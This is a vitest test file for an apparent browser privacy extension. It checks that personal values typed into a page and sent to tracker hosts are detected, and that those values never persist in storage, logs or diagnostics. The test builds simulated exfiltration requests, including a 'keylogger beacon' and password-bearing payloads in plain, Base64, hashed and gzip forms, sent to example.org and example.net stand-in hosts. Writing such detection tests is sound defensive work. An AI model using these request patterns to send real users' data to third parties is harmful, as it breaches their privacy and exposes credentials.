// ADR-020 §4, §8, §12, REQ-005 (S07): the whole value-match pipeline on the module canaries — keyed fingerprints of
// typed values (engine, as protect.js computes them) → the SW lane → requests carrying the values plain, URL-encoded,
// Base64, hashed (hex and Base64) and inside a Base64 container, in query, path, form, JSON and text bodies, plus a
// keylogger beacon before the value (token ring) and a gzip body (opaque). Afterwards storage.session,
// storage.local, the module database, the projection, diagnostics, lane debug numbers and everything written to the
// console contain neither a canary nor any of its variants, nor a URL. Only the evidence records exist, and every
// string in them is a domain, an enum, a parameter name, a path template or an opaque id. A value in the URL path
// (single word, base64url, unpadded hash Base64; also one typed after its request) is `:id` in every path template.

import { createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  ATTRIBUTION_CONFIDENCES,
  COUNT_QUALITIES,
  DELIVERY_STATES,
  FIELD_KINDS,
  FRAME_CONTEXTS,
  HOST_CATEGORIES,
  PARAM_NAME_PATTERN,
  PROTECT_HTTP_METHODS,
  PROTECT_KINDS,
  PROTECT_LIMITATIONS,
  PROTECT_REQUEST_KINDS,
  PROTECT_RULE_IDS,
  SINCE_INPUT,
  SITE_RELATIONS,
  SUBMIT_TIMINGS,
  TRANSFER_CLASSES,
  VALUE_ENCODINGS,
  VALUE_LOCATIONS,
  isDomainName,
  isEndpointPathTemplate,
} from '@detect-expert/contracts';
import {
  commitTop,
  emitRequest,
  emitSent,
  findCanaries,
  hello,
  input,
  pageCtx,
  report,
  request,
  settleProtect,
  setupValueMatch,
  sha256Hex,
  transfers,
} from '../../packages/background/test/protect/value-match-support';
import { pathTemplate } from '../../packages/attribution/src/index';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const registry = JSON.parse(readFileSync(path.join(root, 'fixtures/privacy/canaries.json'), 'utf8')) as { protect: Array<{ id: string; value: string }> };
const canary = (id: string): string => registry.protect.find((c) => c.id === id)!.value;
const EMAIL = canary('protect-email');
const PHONE = canary('protect-phone');
const NAME = canary('protect-name');
const PASSWORD = canary('protect-password');
const ALL = [EMAIL, PHONE, NAME, PASSWORD, EMAIL.toLowerCase(), '79005557391', '+79005557391', NAME.toLowerCase()];

const ENUMS = new Set<string>([
  ...ATTRIBUTION_CONFIDENCES, ...COUNT_QUALITIES, ...DELIVERY_STATES, ...FIELD_KINDS, ...FRAME_CONTEXTS, ...HOST_CATEGORIES, ...PROTECT_HTTP_METHODS,
  ...PROTECT_KINDS, ...PROTECT_LIMITATIONS, ...PROTECT_REQUEST_KINDS, ...PROTECT_RULE_IDS, ...SINCE_INPUT, ...SITE_RELATIONS, ...SUBMIT_TIMINGS,
  ...TRANSFER_CLASSES, ...VALUE_ENCODINGS, ...VALUE_LOCATIONS, 'derived', 'low', 'medium', 'high', '1',
]);

function strings(value: unknown, out: string[] = []): string[] {
  if (typeof value === 'string') out.push(value);
  else if (Array.isArray(value)) for (const v of value) strings(v, out);
  else if (value !== null && typeof value === 'object') for (const v of Object.values(value as Record<string, unknown>)) strings(v, out);
  return out;
}

let logged: string[] = [];
beforeEach(() => {
  logged = [];
  for (const level of ['log', 'info', 'warn', 'error', 'debug'] as const) {
    vi.spyOn(console, level).mockImplementation((...args: unknown[]) => {
      logged.push(args.map((a) => (typeof a === 'string' ? a : JSON.stringify(a))).join(' '));
    });
  }
});
afterEach(() => {
  vi.restoreAllMocks();
});

describe('value-match pipeline on canaries (REQ-005 revision, ADR-020 §4)', () => {
  it('nothing derived from a value or a URL is kept anywhere; evidence holds only enums, domains and templates', async () => {
    const s = await setupValueMatch();
    commitTop(s);
    const ack = await hello(s);
    await s.controller.onPageMessage(pageCtx(), { schemaVersion: 1, type: 'protect-arm', fieldKind: 'email' });
    // A keylogger beacon before the fingerprints (token ring), then the values.
    const early = emitRequest(s, request({ url: 'https://k.collect.example.org/fsink/k', type: 'ping', body: JSON.stringify({ v: EMAIL }) }));
    emitSent(s, early);
    s.clock.t += 300;
    await input(s, ack, [{ kind: 'email', value: EMAIL }, { kind: 'phone', value: PHONE, fieldRef: 2 }, { kind: 'name', value: NAME, fieldRef: 3 }]);
    const sends = [
      request({ url: 'https://px.tracker.example.net/tr?ud[em]=' + sha256Hex(EMAIL.toLowerCase()) + '&ud[ph]=' + sha256Hex('79005557391'), type: 'image' }),
      request({ url: 'https://a.example.org/u/' + encodeURIComponent(EMAIL) + '/x?n=' + encodeURIComponent(NAME) }),
      request({ url: 'https://b.example.org/c?d=' + Buffer.from(JSON.stringify({ e: EMAIL, password: PASSWORD })).toString('base64') }),
      request({ url: 'https://c.example.org/f', form: { email: [EMAIL], tel: [PHONE], pass: [PASSWORD] } }),
      request({ url: 'https://d.example.org/j', body: JSON.stringify({ user: { email: EMAIL, fn: NAME }, pwd: PASSWORD }) }),
      request({ url: 'https://e.example.org/t', body: 'customer ' + NAME + ' phone ' + PHONE }),
      request({ url: 'https://f.example.org/b', body: Buffer.from(EMAIL).toString('base64') }),
      request({ url: 'https://g.example.org/z', body: new Uint8Array(gzipSync(Buffer.from(JSON.stringify({ email: EMAIL })))) }),
    ];
    for (const d of sends) {
      emitRequest(s, d);
      emitSent(s, d);
    }
    await settleProtect(20);
    await s.controller.docStore.flush();
    const ev = transfers(s);
    expect(ev.length).toBeGreaterThanOrEqual(8);

    const dumps: Record<string, unknown> = {
      session: Object.fromEntries(s.fake.session.data),
      local: Object.fromEntries(s.fake.local.data),
      db: [...s.db.stores].map(([name, rows]) => [name, [...rows.values()]]),
      projection: report(s),
      diagnostics: s.controller.diagnostics(),
      laneDebug: s.vm.debug!(),
      console: logged,
    };
    for (const [name, dump] of Object.entries(dumps)) {
      const text = JSON.stringify(dump) ?? '';
      expect(findCanaries(text, ALL), name).toEqual([]);
      expect(text, name + ' holds no URL').not.toMatch(/https?:\/\//);
      expect(text, name + ' holds no query').not.toMatch(/ud\[em\]=|\?d=|\?n=/);
    }
    for (const e of ev) {
      const { paramName, ...rest } = e;
      if (paramName !== undefined) {
        expect(PARAM_NAME_PATTERN.test(paramName), paramName).toBe(true);
        expect(paramName, 'a parameter name is never ID-like').not.toMatch(/[0-9]{6,}|[0-9a-f]{12,}/i);
      }
      for (const str of strings(rest)) {
        const ok = ENUMS.has(str) || isDomainName(str) || isEndpointPathTemplate(str) || /^pe-[0-9a-z]{1,12}$/.test(str);
        expect(ok, 'unexpected string in evidence: ' + str).toBe(true);
      }
      expect(Object.keys(e)).not.toEqual(expect.arrayContaining(['value', 'hash', 'mask', 'url', 'query', 'len', 'length']));
    }
    expect(ev.some((e) => e.limitationCodes.includes('body-had-credential-fields'))).toBe(true);
  });

  it('a value in the URL path never stays in an endpoint template (review round 1)', async () => {
    const WORD = 'Kanareikova'; // a single-word name
    const SHORT = 'kn.vm@mail.test'; // short enough for a base64url segment of ≤ 32 characters
    const NORMALIZED = NAME.toLowerCase().replace(/\s+/g, '');
    const b64u = (v: string): string => Buffer.from(v, 'utf8').toString('base64url');
    const hashB64 = (algo: string, v: string): string => createHash(algo).update(v, 'utf8').digest('base64').replace(/=+$/, '');
    const literals = [NORMALIZED, b64u(SHORT), hashB64('md5', NAME.toLowerCase()), hashB64('sha1', '79005557391'), WORD];
    const urls = [
      'https://a.example.org/n/' + literals[0],
      'https://b.example.org/c/' + literals[1],
      'https://c.example.org/h/' + literals[2],
      'https://d.example.org/h/' + literals[3],
      'https://e.example.org/u/' + WORD + '?em=' + sha256Hex(SHORT),
    ];
    // Each of them would be a literal of the plain template.
    for (let i = 0; i < urls.length; i++) expect(pathTemplate(urls[i]!), literals[i]).toContain(literals[i]!);
    const s = await setupValueMatch();
    commitTop(s);
    const ack = await hello(s);
    await input(s, ack, [{ kind: 'email', value: SHORT }, { kind: 'phone', value: PHONE, fieldRef: 2 }, { kind: 'name', value: NAME, fieldRef: 3 }]);
    for (const url of urls) {
      const d = emitRequest(s, request({ url, type: 'image' }));
      emitSent(s, d);
    }
    // The single-word name reaches the SW after its request: reverse match and scrub of the stored template.
    s.clock.t += 200;
    await input(s, ack, [{ kind: 'name', value: WORD, fieldRef: 4 }]);
    await settleProtect(20);
    await s.controller.docStore.flush();
    const ev = transfers(s);
    expect(ev.map((e) => e.endpointHost + e.endpointPathTemplate).sort()).toEqual([
      'a.example.org/n/:id', 'b.example.org/c/:id', 'c.example.org/h/:id', 'd.example.org/h/:id', 'e.example.org/u/:id', 'e.example.org/u/:id',
    ]);
    const values = [...ALL, SHORT, WORD, NORMALIZED];
    const dumps: Record<string, unknown> = {
      session: Object.fromEntries(s.fake.session.data),
      local: Object.fromEntries(s.fake.local.data),
      db: [...s.db.stores].map(([name, rows]) => [name, [...rows.values()]]),
      projection: report(s),
      diagnostics: s.controller.diagnostics(),
      laneDebug: s.vm.debug!(),
      console: logged,
    };
    for (const [name, dump] of Object.entries(dumps)) {
      const text = JSON.stringify(dump) ?? '';
      expect(findCanaries(text, values), name).toEqual([]);
      for (const l of literals) expect(text.includes(l), name + ' holds ' + l.slice(0, 6)).toBe(false);
    }
  });
});
